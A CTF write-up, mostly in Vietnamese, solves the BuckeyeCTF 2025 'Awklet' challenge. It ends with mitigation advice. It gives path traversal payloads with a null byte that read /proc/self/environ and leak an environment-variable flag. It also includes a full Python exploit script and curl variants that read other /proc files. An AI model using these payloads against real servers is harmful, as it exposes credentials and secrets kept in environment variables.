# Awklet

## Challenge Description

```
Một ứng dụng web sử dụng AWK script để generate ASCII art từ text input.
User có thể chọn font khác nhau (standard, block, slant, shadow).
AWK script chạy như CGI script trên Apache, với FLAG được pass qua environment variable.
```

**Files provided:**

- AWK script (awklet.awk)
- Font files (standard.txt, block.txt, slant.txt, shadow.txt)
- HTML frontend (index.html)
- Dockerfile

**Challenge URL:** `http://awklet.challs.pwnoh.io/`

---

## Difficulty Assessment

### Overall Difficulty: Medium

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐⭐☆
- **Research Required:** ⭐⭐⭐☆☆
- **Time Consumption:** ⭐⭐⭐☆☆
- **Guessing Factor:** ⭐⭐⭐☆☆

**Why this difficulty?**
Bài này yêu cầu hiểu về AWK scripting, CGI environment variables, path traversal, và null byte injection. Điểm khó là nhận ra cần dùng null byte để bypass `.txt` extension và đọc `/proc/self/environ`.

---

## Topics & Techniques

### Primary Topic

- **Path Traversal + Null Byte Injection** - Bypass file extension restriction để đọc arbitrary files

### Sub-topics & Skills Required

- [x] **AWK Scripting** - Hiểu cách AWK xử lý files và strings
- [x] **CGI Environment** - Hiểu về CGI environment variables và `/proc/self/environ`
- [x] **Path Traversal** - Directory traversal để access files ngoài working directory
- [x] **Null Byte Injection** - Sử dụng `%00` để truncate string và bypass extension
- [x] **Linux /proc filesystem** - Hiểu về `/proc/self/environ` để đọc environment variables

---

## Tools Used

### Essential Tools

```bash
# Browser để test payloads
curl "http://target/cgi-bin/awklet.awk?name=hi&font=standard"

# URL encoding
python -c "from urllib.parse import quote; print(quote('../../../proc/self/environ\x00'))"
```

### Tools List

| Tool         | Purpose                | Installation |
| ------------ | ---------------------- | ------------ |
| Browser/cURL | Testing payloads       | Built-in     |
| Burp Suite   | Intercept & modify req | Download     |
| Python       | URL encoding           | Built-in     |

---

## Useful Resources

### Documentation & References

- [AWK Programming](https://www.gnu.org/software/gawk/manual/gawk.html) - GNU AWK manual
- [CGI Environment Variables](https://www.w3.org/CGI/) - CGI specification
- [Linux /proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) - /proc documentation
- [Null Byte Injection](https://owasp.org/www-community/attacks/Null_Byte_Injection) - OWASP null byte attacks

### Learning Materials

- [Path Traversal - PortSwigger](https://portswigger.net/web-security/file-path-traversal) - Directory traversal attacks
- [HackTricks Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion) - Path traversal techniques

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Khai thác path traversal trong parameter `font` để đọc `/proc/self/environ`. Sử dụng null byte injection (`%00`) để bypass việc AWK tự động append `.txt` extension. Flag được leak từ environment variable `FLAG`.

---

### Step 1: Source Code Analysis

**Objective:** Phân tích AWK script và Dockerfile để hiểu cơ chế

**Phân tích AWK script:**

```awk
BEGIN {
    parse_query(ENVIRON["QUERY_STRING"], GET)
    # ⚠️ AWK có thể access environment variables qua ENVIRON

    if ("name" in GET) {
        font_name = (("font" in GET) ? GET["font"] : "standard")
        text = GET["name"]
        render_ascii(text, font_name)  # font_name từ user input
    }
}

function load_font(font_name, font,    filename, line, char, row, c) {
    filename = font_name ".txt"  # ⚠️ Tự động append .txt

    while ((getline line < filename) > 0) {  # ⚠️ Đọc file
        font[char, row] = line
        # ...
    }
}

function render_ascii(text, font_name,    font, i, j, c, char, line_out) {
    load_font(font_name, font)

    print "Here's your " font_name " ascii art:\n"  # ⚠️ Print font_name
    # ...
}
```

**Phân tích Dockerfile:**

```dockerfile
RUN echo "PassEnv FLAG" >> /etc/apache2/conf-available/flag.conf && \
    a2enconf flag
# ⚠️ Apache passes FLAG environment variable to CGI scripts
```

**Observations:**

- Parameter `font` được dùng để construct filename: `font_name + ".txt"`
- AWK đọc file với `getline` - có thể khai thác path traversal
- FLAG được pass qua environment variable `FLAG`
- Font name được print trong output: `"Here's your " font_name " ascii art:\n"`
- `.txt` extension được tự động append → cần bypass

---

### Step 2: Testing Path Traversal

**Objective:** Xác nhận path traversal hoạt động

**Test 1: Relative path trong cùng directory**

```
GET /cgi-bin/awklet.awk?name=hi&font=./standard
```

**Result:** ✅ Thành công - hiển thị ASCII art bình thường

**Test 2: Path traversal với `../`**

```
GET /cgi-bin/awklet.awk?name=hi&font=../standard
```

**Result:** ❌ Không hiển thị text → File `../standard.txt` không tồn tại

**Key findings:**

- Path traversal có thể hoạt động
- Vấn đề: `.txt` extension được append tự động
- Cần tìm cách bypass `.txt` hoặc tìm file có extension `.txt`

---

### Step 3: Identifying Target File

**Objective:** Tìm file chứa FLAG và cách đọc nó

**Attempt 1: Đọc flag.conf**

```
GET /cgi-bin/awklet.awk?name=hi&font=../../../../etc/apache2/conf-available/flag.conf
```

**Result:** ❌ Thất bại

- File path trở thành: `../../../../etc/apache2/conf-available/flag.conf.txt`
- File không tồn tại

**Attempt 2: AWK Expression Injection**

```
GET /cgi-bin/awklet.awk?name=hi&font=test" ENVIRON["FLAG"] "
(URL encoded: font=test%22%20ENVIRON%5B%22FLAG%22%5D%20%22)
```

**Result:** ❌ Không work

- Output: `Here's your test" ENVIRON["FLAG"] " ascii art:`
- AWK không evaluate expression trong string literal context

**Insight:** Cần tìm file thực sự chứa FLAG value, không phải config file.

---

### Step 4: Discovering /proc/self/environ

**Objective:** Tìm cách đọc environment variables từ filesystem

**Linux /proc filesystem:**

- `/proc/self/environ` chứa tất cả environment variables của process hiện tại
- Format: `KEY1=value1\0KEY2=value2\0...` (null-separated)
- CGI scripts inherit environment variables từ Apache
- FLAG được pass vào via `PassEnv FLAG`

**Test:**

```
GET /cgi-bin/awklet.awk?name=hi&font=../../../proc/self/environ
```

**Result:** ❌ File không đọc được

- Path trở thành: `../../../proc/self/environ.txt`
- File `/proc/self/environ.txt` không tồn tại

**Problem:** Cần bypass `.txt` extension!

---

### Step 5: Null Byte Injection

**Objective:** Sử dụng null byte để truncate `.txt` extension

**Technique: Null Byte Injection**

Trong nhiều ngôn ngữ (C, PHP cũ), null byte (`\0` hoặc `%00`) kết thúc string:

```
"file.php\0.txt" → interpreted as "file.php"
```

AWK/gawk có thể vulnerable với null byte trong file operations!

**Final Payload:**

```
GET /cgi-bin/awklet.awk?name=hi&font=../../../proc/self/environ%00
```

**Explanation:**

- User input: `../../../proc/self/environ%00`
- URL decode: `../../../proc/self/environ\0`
- AWK concatenates: `"../../../proc/self/environ\0" ".txt"`
- Filename: `../../../proc/self/environ\0.txt`
- `getline` operation: Null byte truncates → actual file opened: `../../../proc/self/environ` ✅

---

### Step 6: Getting the Flag

**Objective:** Extract flag từ /proc/self/environ output

**Final payload:**

```bash
curl "http://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=hi&font=../../../proc/self/environ%00"
```

**Response:**

```
Here's your ../../../proc/self/environ ascii art:

FLAG=bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}HTTP_HOST=awklet.challs.pwnoh.io...
```

**Flag obtained:**

```
bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}
```

**Note:** Flag message: "next time i'm writing it in sed" - Author's joke về việc viết CGI script bằng AWK 😄

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Awklet Challenge - BuckeyeCTF 2025
"""

import requests
import re
from urllib.parse import quote

TARGET_URL = "http://awklet.challs.pwnoh.io"

def exploit():
    print("[*] Awklet CTF - Path Traversal + Null Byte Injection")
    print("[*] Target:", TARGET_URL)

    # Payload: Read /proc/self/environ with null byte to bypass .txt extension
    payload = "../../../proc/self/environ\x00"

    # URL encode (special handling for null byte)
    # %00 = null byte
    encoded_payload = quote(payload, safe='')

    url = f"{TARGET_URL}/cgi-bin/awklet.awk?name=hi&font={encoded_payload}"

    print(f"[*] Payload: {payload.encode('unicode_escape').decode()}")
    print(f"[*] URL: {url}")

    try:
        response = requests.get(url)

        if response.status_code == 200:
            print("[+] Request successful!")

            # Extract flag from environment variables
            # Format: FLAG=bctf{...}
            flag_match = re.search(r'FLAG=(bctf\{[^}]+\})', response.text)

            if flag_match:
                flag = flag_match.group(1)
                print(f"\n[!] FLAG FOUND: {flag}\n")

                # Show full environ output (truncated)
                print("[*] /proc/self/environ content preview:")
                environ_preview = response.text[:500]
                print(environ_preview)
            else:
                print("[-] Flag not found in response")
                print("[*] Response preview:")
                print(response.text[:500])
        else:
            print(f"[-] Request failed with status code: {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Direct curl with null byte

```bash
# Using curl with URL-encoded null byte
curl "http://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=x&font=../../../proc/self/environ%00"
```

### Method 3: Reading other /proc files

```bash
# Read process command line
curl "http://target/cgi-bin/awklet.awk?name=x&font=../../../proc/self/cmdline%00"

# Read process status
curl "http://target/cgi-bin/awklet.awk?name=x&font=../../../proc/self/status%00"
```

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **AWK in CGI Context:** AWK scripts running as CGI can access environment variables via `ENVIRON[]` array và có thể read arbitrary files với `getline`.

2. **Null Byte Injection Still Works:** Mặc dù null byte injection đã bị patch trong nhiều ngôn ngữ (PHP 5.3+), nó vẫn có thể work trong AWK/gawk với file operations.

3. **/proc/self/environ is Powerful:** `/proc/self/environ` chứa tất cả environment variables của process, rất hữu ích để leak sensitive data trong CTF và real-world.

4. **Path Traversal + Extension Bypass:** Khi application tự động append extension, có thể bypass bằng:

   - Null byte injection (`%00`)
   - Double extension tricks
   - URL encoding tricks

5. **Testing Methodology:** Systematic testing từ simple → complex:
   - Test relative path (`./file`)
   - Test traversal (`../file`)
   - Test bypass techniques (`file%00`)

### Mistakes Made

- ❌ Thử inject AWK expression vào string → ✅ AWK không evaluate trong string literal context
- ❌ Thử đọc flag.conf trực tiếp → ✅ Cần tìm file chứa FLAG value thực sự
- ❌ Quên về null byte injection → ✅ Nhớ lại kỹ thuật cũ vẫn work với AWK

### Tips & Tricks

- 💡 Khi thấy file extension được auto-append, nghĩ đến null byte injection
- 💡 `/proc/self/environ` là treasure trove cho environment variable leakage
- 💡 AWK `getline` đọc files → potential path traversal
- 💡 Test path traversal systematically: `./`, `../`, `../../`, etc.
- 💡 URL encode null byte: `%00` hoặc `\x00` trong scripts

### Real-world Application

**Path Traversal + Null Byte trong production:**

- **File Download Features:** Download file bằng filename parameter
- **Template Engines:** Load templates từ user-controlled paths
- **Image Processing:** Load images để resize/convert
- **Log Viewers:** View logs với filename parameter
- **CGI Scripts:** Đặc biệt scripts cũ viết bằng Perl/AWK/Shell

**Impact:**

- Read sensitive files (`/etc/passwd`, config files, source code)
- Leak environment variables (API keys, credentials)
- In some cases: RCE nếu combine với file upload

---

## Prevention & Mitigation

### How to prevent Path Traversal?

1. **Whitelist allowed files:**

```awk
# Bad code (vulnerable)
function load_font(font_name, font) {
    filename = font_name ".txt"  # ❌ User input directly used
    while ((getline line < filename) > 0) {
        # ...
    }
}

# Good code (secure)
function load_font(font_name, font) {
    # Whitelist allowed fonts
    allowed_fonts["standard"] = 1
    allowed_fonts["block"] = 1
    allowed_fonts["slant"] = 1
    allowed_fonts["shadow"] = 1

    if (!(font_name in allowed_fonts)) {
        print "Invalid font"
        exit 1
    }

    filename = font_name ".txt"  # ✓ Only whitelisted values
    while ((getline line < filename) > 0) {
        # ...
    }
}
```

2. **Sanitize input - remove dangerous characters:**

```awk
function sanitize_filename(input) {
    # Remove path traversal sequences
    gsub(/\.\./, "", input)  # Remove ..
    gsub(/\//, "", input)    # Remove /
    gsub(/\\/, "", input)    # Remove \
    gsub(/\x00/, "", input)  # Remove null bytes

    return input
}

function load_font(font_name, font) {
    font_name = sanitize_filename(font_name)
    filename = font_name ".txt"
    # ...
}
```

3. **Use absolute paths and validate:**

```awk
function load_font(font_name, font,    base_dir, full_path) {
    base_dir = "/usr/lib/cgi-bin/"  # Fixed base directory
    full_path = base_dir font_name ".txt"

    # Validate path doesn't escape base_dir
    if (index(full_path, base_dir) != 1) {
        print "Invalid path"
        exit 1
    }

    while ((getline line < full_path) > 0) {
        # ...
    }
}
```

4. **Don't rely on extension appending for security:**

```awk
# Bad: Appending extension doesn't prevent traversal
filename = user_input ".txt"  # ❌ Can be bypassed with null byte

# Good: Validate before and after
if (user_input !~ /^[a-zA-Z0-9_-]+$/) {
    exit 1
}
filename = base_dir "/" user_input ".txt"
```

### Prevent Null Byte Injection

```awk
# Check for null bytes in input
function has_null_byte(str,    i) {
    for (i = 1; i <= length(str); i++) {
        if (substr(str, i, 1) == "\0") {
            return 1
        }
    }
    return 0
}

if (has_null_byte(font_name)) {
    print "Invalid input"
    exit 1
}
```

### Secure Environment Variable Handling

```dockerfile
# Don't pass sensitive data via environment variables to CGI
# Use secure session management instead

# If must use environment variables:
# 1. Minimize exposure
# 2. Use secrets management systems
# 3. Don't log environment variables
# 4. Restrict /proc access
```

### Defense in Depth

```bash
# 1. Run CGI scripts with minimal privileges
# 2. Use chroot/containers
# 3. Disable /proc if not needed
# 4. Monitor file access
# 5. Input validation at multiple layers
```

---

## References & Credits

### Official Resources

- Challenge author: BuckeyeCTF 2025 Team
- Challenge URL: http://awklet.challs.pwnoh.io/

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [GNU AWK](https://www.gnu.org/software/gawk/) - AWK implementation
- [Apache HTTP Server](https://httpd.apache.org/) - Web server with CGI support
- [curl](https://curl.se/) - HTTP client

### Additional Reading

- [AWK Security Considerations](https://www.gnu.org/software/gawk/manual/html_node/Security.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Null Byte Injection Attacks](https://owasp.org/www-community/attacks/Null_Byte_Injection)
- [Linux /proc filesystem](https://www.kernel.org/doc/html/latest/filesystems/proc.html)
